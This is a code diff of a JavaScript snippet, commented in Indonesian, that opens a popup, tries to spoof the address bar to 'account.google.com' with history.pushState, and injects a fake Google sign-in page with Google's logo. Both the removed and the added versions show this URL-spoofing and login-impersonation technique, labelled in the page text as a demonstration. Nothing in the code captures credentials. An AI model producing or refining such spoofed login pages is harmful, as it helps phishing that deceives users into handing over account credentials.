@@ -1,24 +1,25 @@
 <script>
 function f() {
-    w = window.open("about:blank");
+    // Buka popup dengan URL yang mirip
+    w = window.open("https://your-legitimate-domain.com/path", "_blank");
     
-    // Tunggu popup terbuka, lalu manipulasi
     setTimeout(() => {
-        // Tulis konten palsu di popup
-        w.document.write(`
-            <html>
-            <head><title>Google Account</title></head>
-            <body>
-                <h1>Google Account Login</h1>
-                <p>This is a fake login page</p>
-                <!-- Tambahkan elemen yang mirip dengan aslinya -->
-            </body>
-            </html>
-        `);
-        
-        // Manipulasi URL di address bar TANPA redirect
-        w.history.pushState({}, "Google Account", "https://account.google.com");
-        
-    }, 100);
+        try {
+            // Coba manipulasi state
+            w.history.pushState({}, "Google", "https://account.google.com");
+            
+            // Inject konten palsu
+            w.document.body.innerHTML = `
+                <div style="font-family: Arial, sans-serif; padding: 20px;">
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+                    <h2>Sign in</h2>
+                    <p>This is a fake login page for demonstration</p>
+                </div>
+            `;
+            
+        } catch(e) {
+            console.log("Security restriction:", e);
+        }
+    }, 500);
 }
 </script>
